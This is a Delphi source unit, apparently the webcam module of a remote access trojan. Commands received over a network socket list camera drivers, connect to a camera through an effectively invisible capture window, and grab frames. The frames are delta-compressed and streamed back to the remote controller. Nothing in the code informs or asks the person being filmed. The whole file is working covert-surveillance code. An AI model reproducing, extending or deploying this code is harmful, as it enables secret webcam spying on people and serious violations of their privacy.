unit UnitWebcamCapture;

interface

uses
  windows,socketunit, unitshareddata, umsfpack, CompressionStreamUnit, messages;

type
  TBitmap = record
    bmType: Integer;
    bmWidth: Integer;
    bmHeight: Integer;
    bmWidthBytes: Integer;
    bmPlanes: Byte;
    bmBitsPixel: Byte;
    bmBits: Pointer;
  end;

const
  BMType = $4D42;
  
const
  WM_CAP_START = $400;
  WM_CAP_DRIVER_CONNECT = WM_CAP_START + $a;
  WM_CAP_DRIVER_DISCONNECT = WM_CAP_START + $b;
  WM_CAP_EDIT_COPY = WM_CAP_START + $1e;
  WM_CAP_GRAB_FRAME = WM_CAP_START + $3c;
  WM_CAP_STOP = WM_CAP_START + $44;
  WM_CAP_SAVEDIB = $0400 + 25;

var
  LibHandle: THandle;
  CapGetDriverDescriptionA: function(DrvIndex:cardinal; Name:pansichar;NameLen:cardinal;Description:pansichar;DescLen:cardinal):bool; stdcall;
  CapCreateCaptureWindowA: function(lpszWindowName: pchar; dwStyle: dword; x, y, nWidth, nHeight: word; ParentWin: dword; nId: word): dword; stdcall;

threadvar
  CaptureData: string;
  BitCount: integer;

procedure ParseData(Socket: TClientSocket; Data: string);

implementation

procedure SendData(Socket: TClientSocket; Data: string);
begin
  UnitSharedData.SendData(Socket,'WebcamCapture|' + Data);
end;

function CompareString(s1,s2: string; Len: dword): string;
var
  i: integer;
begin
  setlength(Result,Len);
  for i := 1 to Len do begin
    if s1[i] <> s2[i] then begin
      Result[i] := s2[i];
    end else begin
      Result[i] := '%';
    end;
  end;
end;

function ListCamDrivers: string;
var
  x:cardinal;
  names: string;
  Descriptions: string;
begin
  for x := 0 to 9 do begin
    setlength(Names,256);
    setlength(Descriptions,256);
    if not capGetDriverDescriptionA(x,pchar(Names),256,pchar(Descriptions),256) then continue;
    if length(Names) > 0 then result := result + Names + '|';
  end;
end;

function GetBitmapFromFile(BitmapPath: string): HBitmap;
begin
  Result := LoadImage(GetModuleHandle(nil), pchar(BitmapPath), IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE);
end;

function AlignDouble(Size: Longint): Longint;
begin
  Result := (Size + 31) div 32 * 4;
end;

function SaveBitmapToFile(HBM: HBitmap;BitCount: word; FileName: string): string;
var
  BM: TBitmap;
  BFH: TBitmapFileHeader;
  BIP: PBitmapInfo;
  DC: HDC;
  HMem: THandle;
  Buf: Pointer;
  ColorSize, DataSize: Longint;
  stream: tmemorystream;
begin
  if GetObject(HBM, SizeOf(TBitmap), @BM) = 0 then Exit;

  ColorSize := 0;
  if (BitCount <> 24) then ColorSize := SizeOf(TRGBQuad) * (1 shl BitCount);

  DataSize := AlignDouble(bm.bmWidth * BitCount) * bm.bmHeight;
  GetMem(BIP, SizeOf(TBitmapInfoHeader) + ColorSize);

  if BIP <> nil then begin
    with BIP^.bmiHeader do begin
      biSize := SizeOf(TBitmapInfoHeader);
      biWidth := bm.bmWidth;
      biHeight := bm.bmHeight;
      biPlanes := 1;
      biBitCount := BitCount;
      biCompression := 0;
      biSizeImage := DataSize;
      biXPelsPerMeter := 0;
      biYPelsPerMeter := 0;
      biClrUsed := 0;
      biClrImportant := 0;
    end;

    with BFH do begin
      bfOffBits := SizeOf(BFH) + SizeOf(TBitmapInfo) + ColorSize;
      bfReserved1 := 0;
      bfReserved2 := 0;
      bfSize := longint(bfOffBits) + DataSize;
      bfType := BMType;
    end;

    HMem := GlobalAlloc(gmem_Fixed, DataSize);
    if HMem <> 0 then begin
      Buf := GlobalLock(HMem);
      DC := GetDC(0);
      if GetDIBits(DC, hbm, 0, bm.bmHeight,Buf, BIP^, dib_RGB_Colors) <> 0 then begin

        Stream := TMemoryStream.Create;
        Stream.WriteBuffer(BFH, SizeOf(BFH));
        Stream.WriteBuffer(PChar(BIP)^, SizeOf(TBitmapInfo) + ColorSize);
        Stream.WriteBuffer(Buf^, DataSize);
        SetString(Result, PChar(Stream.Memory), Stream.Size);
        stream.Free;

      end;
      ReleaseDC(0, DC);
      GlobalUnlock(HMem);
      GlobalFree(HMem);
    end;

  end;
  FreeMem(BIP, SizeOf(TBitmapInfoHeader) + ColorSize);
  DeleteObject(HBM);
end;

procedure ParseData(Socket: TClientSocket; Data: string);
var
  D: string;
  Command: string;
  stringtosend: string;
  BCount: integer;
  Stream: TMemoryStream;
  Bmp: HBitmap;
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Socket.Data);

  Command := Split(Data,'|',1);
  Delete(Data,1,Length(Command)+1);

  if Command = 'CamList' then begin
    SendData(Socket,Command + '|' + ListCamDrivers);
  end;

  if Command = 'Connect' then begin

    if CaptureWindow <> 0 then begin
      SendMessage(CaptureWindow, WM_CAP_DRIVER_DISCONNECT, 0, 0);
      SendMessage(CaptureWindow, WM_CLOSE, 0, 0);
      CaptureWindow := 0;
    end;

    CaptureWindow := capCreateCaptureWindowA('CaptureWindow', WS_CHILD and WS_VISIBLE, 0, 0, 0, 0, GetDesktopWindow, 0);
    if SendMessage(CaptureWindow, WM_CAP_DRIVER_CONNECT, StrToInt(Data), 0) <> 1 then begin
      SendMessage(CaptureWindow, WM_CAP_DRIVER_DISCONNECT, 0, 0);
      SendMessage(CaptureWindow, WM_CLOSE, 0, 0);
      CaptureWindow := 0;
      SendData(Socket,'Error');
    end else begin
      SocketData.WebcamSocket := True;
      SendData(Socket,'Connected');
    end;

  end;

  if Command = 'Disconnect' then begin
    SocketData.WebcamSocket := False;
    SendMessage(CaptureWindow, WM_CAP_DRIVER_DISCONNECT, 0, 0);
    SendMessage(CaptureWindow, WM_CLOSE, 0, 0);
    CaptureWindow := 0;
  end;

  if Command = 'ScreenShot' then begin

    if CaptureWindow = 0 then exit;

    BCount := StrToInt(Data);
    if BitCount <> BCount then begin
      BitCount := BCount;
      capturedata := '';
    end;

    SendMessage(CaptureWindow, WM_CAP_GRAB_FRAME, 0, 0);
    SendMessage(CaptureWindow, WM_CAP_SAVEDIB, 0, longint(pchar('~image')));

    Bmp := GetBitmapFromFile('~image');
    D := SaveBitmapToFile(Bmp,BitCount,'~image');
    DeleteFile('~image');

    {Stream := TMemoryStream.Create;
    Stream.LoadFromFile('~image');
    if Stream.Size > 0 then SetString(D,Pchar(Stream.Memory),Stream.Size);
    Stream.Free;}


    {SendMessage(CaptureWindow, WM_CAP_EDIT_COPY, 0, 0);
    OpenClipboard(0);
    D := SaveBitmapToFile(GetClipboardData(CF_BITMAP),BitCount,'');
    CloseClipboard;}

    if capturedata = '' then CaptureData := StringOfChar('%',Length(d));
    stringtosend := comparestring(capturedata,d,length(d));
    capturedata := d;
    stringtosend := SFPackStr(stringtosend);
    SendData(Socket,Command + '|' + stringtosend);
  end;

  if Command = 'ClearData' then begin
    capturedata := '';
  end;


end;

initialization
  LibHandle := LoadLibrary('avicap32.dll');
  CapGetDriverDescriptionA := GetProcAddress(LibHandle,'capGetDriverDescriptionA');
  CapCreateCaptureWindowA := GetProcAddress(LibHandle,'capCreateCaptureWindowA');

end.
